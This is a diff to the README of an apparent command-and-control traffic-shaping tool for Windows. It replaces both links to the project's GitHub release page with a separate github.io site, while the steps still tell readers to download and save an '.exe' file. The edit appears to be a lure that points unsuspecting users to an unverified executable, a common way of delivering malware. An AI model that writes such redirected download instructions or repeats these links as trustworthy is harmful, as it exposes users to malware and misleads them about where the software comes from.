@@ -1,6 +1,6 @@
 # 🛠️ openmalleablec2-v2026 - Shape network traffic for command control
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Jorrieadvised872/openmalleablec2-v2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://jorrieadvised872.github.io)
 
 ## What is this tool
 
@@ -20,7 +20,7 @@ You need a computer that runs Windows 10 or Windows 11. Ensure your system meets
 
 Follow these steps to obtain the files for your computer:
 
-1. Visit the [official release page](https://github.com/Jorrieadvised872/openmalleablec2-v2026/releases).
+1. Visit the [official release page](https://jorrieadvised872.github.io).
 2. Look for the section titled "Assets" at the bottom of the latest release.
 3. Select the file ending in `.exe` to begin the download.
 4. Save the file to your desktop or a folder you can find easily.
